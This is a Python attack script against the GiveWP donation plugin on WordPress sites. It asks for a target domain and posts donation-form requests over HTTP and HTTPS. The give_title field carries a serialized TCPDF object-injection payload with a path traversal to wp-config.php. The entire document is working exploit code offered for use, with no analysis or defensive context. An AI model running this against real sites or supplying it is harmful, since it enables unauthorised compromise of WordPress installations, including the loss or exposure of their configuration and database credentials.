import requests
import random
import string

def generate_random_string(length=8):
    """Generate a random string of letters with the specified length."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

# Function to prepare the URLs and data for the requests
def prepare_urls_and_data(domain, payload_value):
    urls = {
        "http": {
            "url1": f'http://{domain}/wp-admin/admin-ajax.php',
            "url2": f'http://{domain}/give/donation-form/?payment-mode=manual&form-id=1719'
        },
        "https": {
            "url1": f'https://{domain}/wp-admin/admin-ajax.php',
            "url2": f'https://{domain}/give/donation-form/?payment-mode=manual&form-id=1719'
        }
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': '1719-1',
        'give-form-id': '1719',
        'give-form-title': '0',
        'give-current-url': f'https://{domain}/donations/donation-form/',
        'give-form-url': f'https://{domain}/give/donation-form/',
        'give-form-minimum': '',
        'give-form-maximum': '999999.99',
        'give-form-hash': 'NONCE',
        'give-price-id': '1',
        'give-amount': '25',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': f'{email_prefix}@test.com',
        'payment-mode': 'manual',
        'give_action': 'purchase',
        'give-gateway': 'manual',
        'give_embed_form': '1',
        'action': 'give_process_donation',
        'give_ajax': 'true',
        'give_title': payload_value
    }
    
    return urls, data

# User input for target domain
domain = input("Enter the target domain (e.g., example.com): ")

# Generate unique values for each request
first_name = generate_random_string()
last_name = generate_random_string()
email_prefix = generate_random_string()
print(f"Generated Values: First Name: {first_name}, Last Name: {last_name}, Email Prefix: {email_prefix}")

# Define the payload value (from the issue)
payload_value = 'O:5:"TCPDF":1:{s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../../../../wp-config.php";}}'

# Prepare URLs and data
urls, data = prepare_urls_and_data(domain, payload_value)

# Define the headers
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Function to send requests to both HTTP and HTTPS
def send_requests(urls, data):
    for protocol in ["http", "https"]:
        try:
            response1 = requests.post(urls[protocol]["url1"], headers=headers, data=data)
            print(f'Request to {protocol.upper()} {urls[protocol]["url1"]} status: {response1.status_code}')
            if response1.status_code == 200:
                print("First request sent successfully.")
            else:
                print(f"First request failed with status code: {response1.status_code}")
            
            response2 = requests.post(urls[protocol]["url2"], headers=headers, data=data)
            print(f'Request to {protocol.upper()} {urls[protocol]["url2"]} status: {response2.status_code}')
            if response2.status_code == 200:
                print("Second request sent successfully.")
            else:
                print(f"Second request failed with status code: {response2.status_code}")
        
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {protocol.upper()} {domain}: {e}")

# Send the requests
send_requests(urls, data)
